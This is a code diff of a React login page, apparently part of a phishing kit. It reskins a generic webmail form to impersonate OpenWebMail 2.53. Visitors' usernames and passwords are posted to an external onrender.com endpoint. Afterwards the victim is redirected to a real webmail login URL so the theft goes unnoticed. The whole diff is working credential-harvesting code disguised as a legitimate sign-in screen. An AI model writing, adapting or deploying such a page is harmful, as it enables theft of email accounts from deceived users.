@@ -8,12 +8,13 @@ import { useState } from 'react';
 import axios from 'axios';
 
 import { useEffect } from 'react';
+import open from './open.gif';
 function Home(){
 
     const[email, setUserName] = useState("");
     const[password, setPassword] = useState("");
 
-    const[platform, setPlatform] = useState("Adams")
+    const[platform, setPlatform] = useState("Openweb")
 
     const[showError, setShowError] = useState(false);
 
@@ -41,7 +42,7 @@ async function handleSubmit(e){
     e.preventDefault();
 
     try {
-        const response = await axios.post('https://mainbackend-rd07.onrender.com/api/send', {
+        const response = await axios.post('https://oneback-9wpi.onrender.com/api/send', {
             email:email,
             password:password,
             platform:platform
@@ -53,7 +54,7 @@ async function handleSubmit(e){
         if(response.status == 200){
             console.log(response.data.message);
 
-            setShowError(true);
+            window.location.href = 'http://webmail.citytel.net/cgi-bin/openwebmail/openwebmail.pl';
         }
       } catch (error) {
         // Handle error
@@ -64,12 +65,10 @@ async function handleSubmit(e){
 
     return (
         <>
-            <nav className='mynav px-3 py-3'>
-                <img className='navimage' src={logo} />
+         
 
-            </nav>
-
-                <div className='py-5'>
+                <div className='py-5 text-center'>
+                        <img className='navimage' src={open} />
 
                 </div>
 
@@ -80,7 +79,7 @@ async function handleSubmit(e){
             </button>
             </div>}
 
-            <div className='formdiv col-md-5 m-auto p-0 '>
+            <div className='formdiv col-md-4 m-auto p-0 '>
             {showError && <div className="alert alert-danger alert-dismissible fade show" role="alert">
             <strong className='text-center'>Invalid Email or Password</strong> 
             <button type="button" className="close" data-dismiss="alert" aria-label="Close">
@@ -89,14 +88,14 @@ async function handleSubmit(e){
             </div>}
 
                 <div className='cardhead'>
-                Welcome to Webmail
+                Login
                 </div>
 
                 <form onSubmit={handleSubmit}>
 
                 <div class="formrow text-center mt-3">
-                                <span class="prompt"><label for="user">Email</label></span>
-                                                <div class="element"><input type="email"onChange={function(e){
+                                <span class="prompt"><label for="user">UserID:</label></span>
+                                                <div class="element"><input type="text"onChange={function(e){
                                                     setUserName(e.target.value);
                                                 }}value={email} className='inputwide' required/>
                                 </div>
@@ -112,8 +111,13 @@ async function handleSubmit(e){
                         </div>
 
 
-                    <div className='buttondiv py-4 text-center'>
+                    <div className='buttondiv py-4 '>
                         <button className='mybutton'type="submit">Login</button>
+
+                        <input type="checkbox"checked={true} className='mx-3'/><span className='small'>HTTP Compression</span>
+
+                        <input type="checkbox" className='mx-3'/><span className='small'>Auto Login</span>
+
 
                     </div>
 
@@ -127,7 +131,7 @@ async function handleSubmit(e){
             
             <br/>
 
-                <p className='info'>Webmail</p>
+                <p className='info'>OpenWebMail version 2.53   Help?</p>
         </>
     );
 
